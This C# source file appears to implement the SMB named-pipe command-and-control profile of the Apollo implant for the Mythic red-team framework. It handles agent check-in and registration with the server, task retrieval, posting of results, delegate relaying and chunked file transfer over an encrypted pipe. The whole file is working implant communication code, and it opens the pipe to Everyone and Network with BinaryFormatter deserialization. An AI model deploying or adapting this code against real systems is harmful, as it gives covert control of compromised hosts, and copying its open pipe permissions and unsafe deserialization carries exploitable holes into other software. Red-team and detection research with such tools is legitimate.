#define C2PROFILE_NAME_UPPER

#if DEBUG
#undef SMBSERVER
#define SMBSERVER
#endif

#if SMBSERVER

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.AccessControl;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO.Pipes;
using IPC;
using Mythic.C2Profiles;
using Apollo.Jobs;
using Apollo.CommandModules;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Mythic.Structs;
using System.Threading;
using Apollo.MessageInbox;
using Apollo.Tasks;
using static Utils.DebugUtils;
using Mythic;
using Mythic.Encryption;

namespace Mythic.C2Profiles
{
    class SMBServerProfile : BindConnectC2Profile
    {

        private BinaryFormatter bf;

        private NamedPipeServerStream serverStream;

        public string PipeName;
        private string baseUUID;
        private Mutex writeMutex = new Mutex();
        private Mutex readMutex = new Mutex();
        private bool holdConnection = false;

        public SMBServerProfile(string pipeName = "pipe_name", string uuid = "UUID_HERE", string psk = "AESPSK")
        {
            baseUUID = uuid;
            base.cryptor = new PSKCrypto(uuid, psk);
            PipeName = pipeName;
            serverStream = CreateNamedPipeServer();
            bf = new BinaryFormatter();
            bf.Binder = new SMBMessageBinder();
            CallbackInterval = 5000;
            CallbackJitter = 0;
        }

        public override byte[] GetFile(string task_id, string file_id, int chunk_size)
        {
            List<byte> fileChunks = new List<byte>();
            try
            {
                Mythic.Structs.UploadFileRegistrationMessage fileReg;
                string response;
                UploadReply reply;
                byte[] data;
                int i = 1;
                do
                {
                    fileReg = new UploadFileRegistrationMessage()
                    {
                        action = "upload",
                        chunk_size = chunk_size,
                        file_id = file_id,
                        full_path = "",
                        chunk_num = i,
                        task_id = task_id
                    };
                    if (Send(task_id, JsonConvert.SerializeObject(fileReg)))
                    {
                        response = (string)Inbox.GetMessage(task_id);
                        reply = JsonConvert.DeserializeObject<UploadReply>(response);
                        data = System.Convert.FromBase64String(reply.chunk_data);
                        for (int j = 0; j < data.Length; j++)
                        {
                            fileChunks.Add(data[j]);
                        }
                        i++;
                    } else
                    {
                        break;
                    }
                } while (i <= reply.total_chunks);
            }
            catch
            {
                return null;
            }
            return fileChunks.ToArray();
        }
        public override byte[] GetFile(Mythic.Structs.UploadFileRegistrationMessage fileReg, int chunk_size)
        {
            string response;
            UploadReply reply;
            byte[] data;
            List<byte> fileChunks = new List<byte>();
            int i = 1;
            // Set requisite attributes
            fileReg.action = "upload";
            fileReg.chunk_size = chunk_size;
            //fileReg.chunk_num = i;
            if (fileReg.full_path != "" && fileReg.full_path != null && (fileReg.task_id == "" || fileReg.task_id == null))
                throw new Exception("Full path given but no task_id set. Aborting.");
            try
            {
                do
                {
                    fileReg.chunk_num = i;
                    if (Send(fileReg.task_id, JsonConvert.SerializeObject(fileReg)))
                    {
                        response = (string)Inbox.GetMessage(fileReg.task_id);
                        reply = JsonConvert.DeserializeObject<UploadReply>(response);
                        data = System.Convert.FromBase64String(reply.chunk_data);
                        for (int j = 0; j < data.Length; j++)
                        {
                            fileChunks.Add(data[j]);
                        }
                        i++;
                    }
                    else break;
                } while (i <= reply.total_chunks);
            }
            catch (Exception ex)
            {
                return null;
            }
            return fileChunks.ToArray();
        }

        public override string SendResponse(string id, Apollo.Tasks.ApolloTaskResponse taskresp)
        {
            try // Try block for HTTP requests
            {
                // Encrypt json to send to server
                //Structs.CheckTaskingRequest req = new Structs.CheckTaskingRequest()
                //{
                //    action = "get_tasking",
                //    tasking_size = 1
                //};
                //if (DelegateMessageQueue.Count > 0)
                //{
                //    DelegateMessageMtx.WaitOne();
                //    DelegateMessageQueue.ToArray();
                //    DelegateMessageQueue.Clear();
                //    //DelegateMessageQueue = new List<Dictionary<string, string>>();
                //    DelegateMessageMtx.ReleaseMutex();
                //}
                // Could add delegate post messages
                //string json = JsonConvert.SerializeObject(req);
                //Apfell.Structs.CheckTaskingResponse resp = JsonConvert.DeserializeObject<Apfell.Structs.CheckTaskingResponse>(Send(json));
                Mythic.Structs.TaskResponse apfellResponse = new Mythic.Structs.TaskResponse
                {
                    action = "post_response",
                    responses = new Apollo.Tasks.ApolloTaskResponse[] { taskresp },
                    delegates = new Dictionary<string, string>[] { },
                };
                //Dictionary<string, string>[] delegateMessages = new Dictionary<string, string>[] { };
                if (DelegateMessageRequestQueue.Count > 0)
                {
                    DelegateMessageRequestMutex.WaitOne();
                    apfellResponse.delegates = DelegateMessageRequestQueue.ToArray();
                    DelegateMessageRequestQueue.Clear();
                    DelegateMessageRequestMutex.ReleaseMutex();
                }
                string json = JsonConvert.SerializeObject(apfellResponse);

                if (Send(id, json))
                {
                    string result = (string)Inbox.GetMessage(id);
                    //Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.task}: {result}");
                    if (result.Contains("success"))
                        // If it was successful, return the result
                        return result;
                }
                //throw (new Exception($"POST Task Response {taskresp.task} Failed"));
            }
            catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
            {
                return e.Message;
            }
            return "";
        }

        public override string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] taskresp, SocksDatagram[] datagrams = null)
        {
            try // Try block for HTTP requests
            {
                // Encrypt json to send to server

                Mythic.Structs.TaskResponse apfellResponse = new Mythic.Structs.TaskResponse
                {
                    action = "post_response",
                    responses = taskresp
                };
                string json = JsonConvert.SerializeObject(apfellResponse);
                //string id = Guid.NewGuid().ToString();
                if (Send(id, json))
                {
                    string result = (string)Inbox.GetMessage(id);
                    if (result.Contains("success"))
                        // If it was successful, return the result
                        return result;
                }
                //Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.task}: {result}");
                //throw (new Exception($"POST Task Response {taskresp.task} Failed"));
            }
            catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
            {
                return e.Message;
            }
            return "";
        }

        public bool SendMessage(SMBMessage message)
        {
            bool bRet;
            SMBMessage[] messages;
            if (SMBMessage.RequiresChunking(((byte[])message.MessageObject).Length))
            {
                messages = SMBMessage.CreateChunkedMessages((byte[])message.MessageObject);
            } else
            {
                messages = new SMBMessage[] { message };
            }
            try
            {
                writeMutex.WaitOne();
                foreach(var msg in messages)
                {
                    bf.Serialize(serverStream, message);
                    serverStream.WaitForPipeDrain();
                }
                bRet = true;
            }
            catch (Exception ex)
            {
                bRet = false;
            }
            finally
            {
                writeMutex.ReleaseMutex();
            }
            return bRet;
        }

        public override bool Send(string id, string message)
        {
            DebugWriteLine($"Encrypting MessageID {id} ({message.Length} bytes)...");
            byte[] reqPayload = Encoding.UTF8.GetBytes(cryptor.Encrypt(message));
            DebugWriteLine($"SUCCESS! Encrypted MessageID {id} ({message.Length} bytes)");
            SMBMessage[] messages;
            if (SMBMessage.RequiresChunking(reqPayload.Length))
            {
                messages = SMBMessage.CreateChunkedMessages(reqPayload);

            }
            else
            {
                messages = new SMBMessage[] { new SMBMessage()
                {
                    MessageType = "",
                    MessageObject = reqPayload
                } };
            }
            try
            {
                DebugWriteLine($"Acquiring send message lock to send Message {id}...");
                writeMutex.WaitOne();
                DebugWriteLine($"LOCK ACQUIRED! Sending {messages.Length} SMB messages associated message inbox {id}...");
                int i = 0;
                foreach (var msg in messages)
                {
                    bf.Serialize(serverStream, msg);
                    serverStream.Flush();
                    serverStream.WaitForPipeDrain();
                    i++;
                    DebugWriteLine($"Sent {i} of {messages.Length} SMB messages attached to Inbox ID {id} to {PipeName}");
                }
                //result = ReadDecryptedStringMessage();
            }
            finally
            {
                writeMutex.ReleaseMutex();
            }
            return true;
        }

        private void ForceStopAgent()
        {
            Inbox.AddMessage("is_active", false);
            CheckTaskingResponse msg = new CheckTaskingResponse()
            {
                action = "get_tasking",
                tasks = new Task[0],
                delegates = new Dictionary<string, string>[0],
                message_id = ""
            };
            string strMsg = JsonConvert.SerializeObject(msg);
            SortMessages(strMsg);
        }

        // returns a UUID of the task_id or get_tasking
        internal bool SortMessages(string message, string id="")
        {
            string key = "";
            string action;
            string msg;
            JToken messageId;
            if (message == null || message == "")
            {
                DebugWriteLine($"Empty message. Abort sort.");
                return false;
            }
            JObject json = (JObject)JsonConvert.DeserializeObject(message);
            action = json.Value<string>("action");
            if (json.TryGetValue("message_id", out messageId))
            {
                key = messageId.ToString();
            }
            
            DebugWriteLine($"Sorting message with action {action}...");
            switch (action)
            {
                case "unlink":
                    ForceStopAgent();
                    break;
                case "checkin":
                    if (key == "")
                        key = "checkin-" + Guid.NewGuid().ToString();
                    DebugWriteLine($"Message Key set to: {key}. Adding to inbox...");
                    Inbox.AddMessage(key, message);
                    DebugWriteLine($"SUCCESS! Added message {key} to inbox!");
                    break;
                case "get_tasking":
                    if (key == "")
                        key = "get_tasking-" + Guid.NewGuid().ToString();
                    DebugWriteLine($"Message Key set to: {key}. Adding to inbox...");
                    Inbox.AddMessage(key, message);
                    DebugWriteLine($"SUCCESS! Added message {key} to inbox!");
                    break;
                case "post_response":
                    var resp = JsonConvert.DeserializeObject<MythicServerResponse>(message);
                    if (resp.delegates != null && resp.delegates.Length > 0)
                    {
                        CheckTaskingResponse delegateMessage = new CheckTaskingResponse()
                        {
                            action = "get_tasking",
                            tasks = new Task[0],
                            delegates = resp.delegates,
                            message_id = key
                        };
                        string delegateMessageString = JsonConvert.SerializeObject(delegateMessage);
                        SortMessages(delegateMessageString);
                    }
                    foreach (var response in resp.responses)
                    {
                        key = response.task_id;
                        msg = JsonConvert.SerializeObject(response);
                        DebugWriteLine($"Message Key set to: {key}. Adding to inbox...");
                        Inbox.AddMessage(key, msg);
                        DebugWriteLine($"SUCCESS! Added message {key} to inbox!");
                    }
                    // Create a new TaskQueue
                    key = "get_tasking-" + Guid.NewGuid().ToString();
                    
                    break;
                case "upload":
                    key = json.Value<string>("task_id");
                    DebugWriteLine($"Message Key set to: {key}. Adding to inbox...");
                    Inbox.AddMessage(key, message);
                    DebugWriteLine($"SUCCESS! Added message {key} to inbox!");
                    break;
                default:
                    if (id == "")
                        throw new Exception("Couldn't parse message");
                    Inbox.AddMessage(id, message);
                    //throw new Exception($"Unsupported message type: {action}");
                    //return false;
                    break;
            }
            return true;
        }

        public override string GetTaskingMessage()
        {
            return (string)Inbox.GetMessage("get_tasking");
        }


        public bool Send(SMBMessage sendMsg)
        {
            bool bRet;
            writeMutex.WaitOne();
            try
            {
                bf.Serialize(serverStream, sendMsg);
                bRet = true;
            }
            catch (Exception ex)
            {
                bRet = false;
            }
            finally
            {
                writeMutex.ReleaseMutex();
            }
            return bRet;
        }

        private void ReadAndSortMessages()
        {
            SMBMessage recvMsg;
            string result = "";
            Dictionary<string, List<SMBMessage>> chunkedMessages = new Dictionary<string, List<SMBMessage>>();
            while (true)
            {
                try
                {
                    DebugWriteLine($"Waiting for a new message from named pipe {PipeName}...");
                    recvMsg = ReadMessage();
                    DebugWriteLine($"Got a new message from named pipe {PipeName}!");
                    if (recvMsg.MessageType == "chunked_message")
                    {
                        //SMBChunkedMessage tmp = (SMBChunkedMessage)recvMsg;
                        if (!chunkedMessages.ContainsKey(recvMsg.MessageID))
                            chunkedMessages[recvMsg.MessageID] = new List<SMBMessage>();
                        chunkedMessages[recvMsg.MessageID].Add(recvMsg);
                        if (chunkedMessages[recvMsg.MessageID].Count == recvMsg.MaxMessages)
                        {
                            byte[] fullMessage = SMBMessage.CombineChunkedMessages(chunkedMessages[recvMsg.MessageID]);
                            chunkedMessages.Remove(recvMsg.MessageID);
                            result = base.cryptor.Decrypt(Encoding.UTF8.GetString(fullMessage));
                        }
                    }
                    else
                    {
                        result = base.cryptor.Decrypt(Encoding.UTF8.GetString((byte[])recvMsg.MessageObject));
                    }
                    if (result != "")
                        SortMessages(result);
                }
                catch (System.Runtime.Serialization.SerializationException ex)
                {
                    DebugWriteLine($"Serialization error attempting to read message from pipe {ex.Message}\n\tStackTrace: {ex.StackTrace}");
                    ForceStopAgent();
                    break;
                }
                catch (Exception ex)
                {
                    DebugWriteLine($"Unknown error occurred. Reason: {ex.Message}, StackTrace:\n{ex.StackTrace}");
                }
                finally
                {
                    recvMsg = null;
                    result = "";
                }
            }
        }

        public override string RegisterAgent(Apollo.Agent agent)
        {
            // Get JSON string for implant
            string json = JsonConvert.SerializeObject(agent);
            byte[] reqPayload = Encoding.UTF8.GetBytes(base.cryptor.Encrypt(json));
            if (holdConnection)
            {
                serverStream.Close();
                serverStream = CreateNamedPipeServer();
                holdConnection = false;
            }
            serverStream.WaitForConnection();
            holdConnection = true;
            Thread t = new Thread(() => ReadAndSortMessages());
            t.Start();
            SMBMessage uuidRegistration = new SMBMessage()
            {
                MessageType = "uuid_registration",
                MessageObject = base.cryptor.GetUUIDBytes()
            };

            // This is the payload uuid, so we need to stage and get the new one
            if (base.cryptor.GetUUIDString() == baseUUID)
            {
                //uuidRegistration.MessageType = "staging_uuid_registration";
                uuidRegistration.MessageObject = Encoding.UTF8.GetBytes("staging-" + base.cryptor.GetUUIDString());
                SMBMessage registerMsg = new SMBMessage()
                {
                    MessageType = "register",
                    MessageObject = reqPayload
                };
                // Get JSON string for implant
                //string result = Send(registrationId, registerMsg);
                string result;
                DebugWriteLine($"Sending uuid_registration message to client...");
                Send(uuidRegistration);
                DebugWriteLine($"SUCCESS! Sent uuid_registration message!");
                DebugWriteLine($"Sending Apfell registration message to client...");
            
                if (Send(registerMsg))
                {
                    DebugWriteLine($"SUCCESS! Sent Apfell registration message!");
                    DebugWriteLine($"Waiting for initial checkin response from Apfell server...");
                    result = (string)Inbox.GetMessage("checkin");
                    DebugWriteLine($"SUCCESS! Got initial checkin response from Apfell server!\n\t{result}");
                    if (result.Contains("success"))
                    {
                        // If it was successful, initialize implant
                        // Response is { "status": "success", "id": <id> }
                        JObject resultJSON = (JObject)JsonConvert.DeserializeObject(result);
                        string newUUID = resultJSON.Value<string>("id");
                        base.cryptor.UpdateUUID(newUUID);
                        SMBMessage notifyRelayMessage = new SMBMessage()
                        {
                            MessageType = "uuid_registration",
                            MessageObject = Encoding.UTF8.GetBytes(newUUID)
                        };
                        // Do something with bool?
                        Send(notifyRelayMessage);
                        return newUUID;
                    }
                    else
                    {
                        throw (new Exception("Failed to retrieve an ID for new callback."));
                    }
                }
                return "";
            } else
            {
                // we've already got an agent uuid, return that.
                Send(uuidRegistration);
                return base.cryptor.GetUUIDString();
            }
        }

        private NamedPipeServerStream CreateNamedPipeServer()
        {
            PipeSecurity pipeSecurityDescriptor = new PipeSecurity();
            PipeAccessRule everyoneAllowedRule = new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow);
            PipeAccessRule networkAllowRule = new PipeAccessRule("Network", PipeAccessRights.ReadWrite, AccessControlType.Allow);       // This should only be used locally, so lets limit the scope
            pipeSecurityDescriptor.AddAccessRule(everyoneAllowedRule);
            pipeSecurityDescriptor.AddAccessRule(networkAllowRule);

            // Gotta be careful with the buffer sizes. There's a max limit on how much data you can write to a pipe in one sweep. IIRC it's ~55,000, but I dunno for sure.
            NamedPipeServerStream pipeServer = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 32768 * 6, 32768* 6, pipeSecurityDescriptor);

            return pipeServer;
        }

        private SMBMessage ReadMessage()
        {
            SMBMessage message;
            try
            {
                readMutex.WaitOne();
                message = (SMBMessage)bf.Deserialize(serverStream);
            }
            finally
            {
                readMutex.ReleaseMutex();
            }
            return message;
        }

        private static object ParseMessage(SMBMessage msg)
        {
            if (msg == null)
                return null;
            switch(msg.MessageType)
            {
                case "Apollo.Jobs.Job":
                    return (Job)msg.MessageObject;
                case "Apollo.Tasks.Task":
                    return (Task)msg.MessageObject;
                default:
                    return msg.MessageObject;
            }
        }


    }
}
#endif